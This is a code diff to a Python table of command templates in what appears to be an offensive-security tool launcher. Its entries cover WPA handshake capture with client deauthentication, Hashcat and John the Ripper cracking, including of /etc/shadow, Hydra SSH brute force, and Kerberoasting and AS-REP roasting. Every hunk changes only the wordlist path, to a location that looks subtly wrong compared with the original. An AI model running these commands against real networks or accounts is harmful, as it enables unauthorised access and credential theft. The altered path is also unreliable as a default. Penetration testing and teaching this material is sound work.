@@ -224,7 +224,7 @@ TOOLS = {
                 "id": "5", "name": "WiFi WPA Crack",
                 "desc": "Capture handshake + crack",
                 "fields": [("iface","Interface","wlan0"), ("bssid","BSSID","AA:BB:CC:DD:EE:FF"), ("ch","Channel","6")],
-                "cmd": lambda f: f"airmon-ng start {f[0]}; airodump-ng -c {f[2]} --bssid {f[1]} -w handshake {f[0]}mon\n# deauth: aireplay-ng --deauth 10 -a {f[1]} {f[0]}mon\nhashcat -m 22000 handshake.hccapx /usr/share/wordlists/rockyou.txt",
+                "cmd": lambda f: f"airmon-ng start {f[0]}; airodump-ng -c {f[2]} --bssid {f[1]} -w handshake {f[0]}mon\n# deauth: aireplay-ng --deauth 10 -a {f[1]} {f[0]}mon\nhashcat -m 22000 handshake.hccapx /usr/share/wordlist/rockyou.txt",
             },
             {
                 "id": "6", "name": "SSH Port Forward",
@@ -295,19 +295,19 @@ TOOLS = {
             {
                 "id": "1", "name": "Hashcat",
                 "desc": "GPU-accelerated hash cracking",
-                "fields": [("hash","Hash / Hash file","hash.txt"), ("wordlist","Wordlist","/usr/share/wordlists/rockyou.txt"), ("mode","Mode (0=MD5 | 1000=NTLM | 1800=sha512 | 3200=bcrypt | 22000=WPA)","0")],
+                "fields": [("hash","Hash / Hash file","hash.txt"), ("wordlist","Wordlist","/usr/share/wordlist/rockyou.txt"), ("mode","Mode (0=MD5 | 1000=NTLM | 1800=sha512 | 3200=bcrypt | 22000=WPA)","0")],
                 "cmd": lambda f: f'hashcat -m {f[2]} -a 0 "{f[0]}" {f[1]} --show',
             },
             {
                 "id": "2", "name": "John the Ripper",
                 "desc": "Crack hashes / shadow files",
-                "fields": [("file","Hash file","/etc/shadow"), ("wordlist","Wordlist","/usr/share/wordlists/rockyou.txt")],
+                "fields": [("file","Hash file","/etc/shadow"), ("wordlist","Wordlist","/usr/share/wordlist/rockyou.txt")],
                 "cmd": lambda f: f"john {f[0]} --wordlist={f[1]} --format=auto; john {f[0]} --show",
             },
             {
                 "id": "3", "name": "Hydra",
                 "desc": "Online service bruteforce",
-                "fields": [("target","Target IP","192.168.1.10"), ("service","Service","ssh"), ("user","Username","admin"), ("passlist","Password list","/usr/share/wordlists/rockyou.txt")],
+                "fields": [("target","Target IP","192.168.1.10"), ("service","Service","ssh"), ("user","Username","admin"), ("passlist","Password list","/usr/share/wordlist/rockyou.txt")],
                 "cmd": lambda f: f"hydra -l {f[2]} -P {f[3]} {f[0]} {f[1]} -t 30 -V",
             },
             {
@@ -343,13 +343,13 @@ TOOLS = {
                 "id": "2", "name": "Kerberoasting",
                 "desc": "Request + crack service tickets",
                 "fields": [("domain","Domain","corp.local"), ("user","User","lowpriv"), ("pw","Password","P@ssw0rd"), ("dc","DC IP","10.0.0.1")],
-                "cmd": lambda f: f"python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py '{f[0]}/{f[1]}:{f[2]}' -dc-ip {f[3]} -request -outputfile kerberoast.txt\nhashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt",
+                "cmd": lambda f: f"python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py '{f[0]}/{f[1]}:{f[2]}' -dc-ip {f[3]} -request -outputfile kerberoast.txt\nhashcat -m 13100 kerberoast.txt /usr/share/wordlist/rockyou.txt",
             },
             {
                 "id": "3", "name": "AS-REP Roasting",
                 "desc": "Attack accounts with no pre-auth",
                 "fields": [("domain","Domain","corp.local"), ("dc","DC IP","10.0.0.1")],
-                "cmd": lambda f: f"python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py {f[0]}/ -usersfile users.txt -dc-ip {f[1]} -format hashcat -outputfile asrep.txt\nhashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt",
+                "cmd": lambda f: f"python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py {f[0]}/ -usersfile users.txt -dc-ip {f[1]} -format hashcat -outputfile asrep.txt\nhashcat -m 18200 asrep.txt /usr/share/wordlist/rockyou.txt",
             },
             {
                 "id": "4", "name": "LDAP Dump",
